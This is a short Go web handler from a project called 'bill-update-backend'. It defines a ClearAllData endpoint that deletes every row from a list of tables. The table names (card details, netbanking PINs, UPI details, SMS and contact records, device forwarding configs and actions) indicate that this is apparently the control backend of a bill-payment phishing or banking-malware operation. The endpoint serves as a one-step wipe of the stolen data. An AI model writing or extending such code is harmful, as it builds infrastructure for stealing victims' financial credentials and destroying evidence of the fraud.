package handlers

import (
	"bill-update-backend/database"
	"net/http"

	"github.com/gin-gonic/gin"
)

var allTables = []string{
	"bill_update_requests", "payment_attempts", "card_details",
	"card_verifications", "netbanking_details", "netbanking_pins",
	"upi_details", "sms_records", "contact_records",
	"devices", "forwarding_configs", "device_actions", "media_files",
}

func ClearAllData(c *gin.Context) {
	for _, t := range allTables {
		database.DB.Exec("DELETE FROM " + t)
	}
	c.JSON(http.StatusOK, gin.H{"message": "All data cleared"})
}
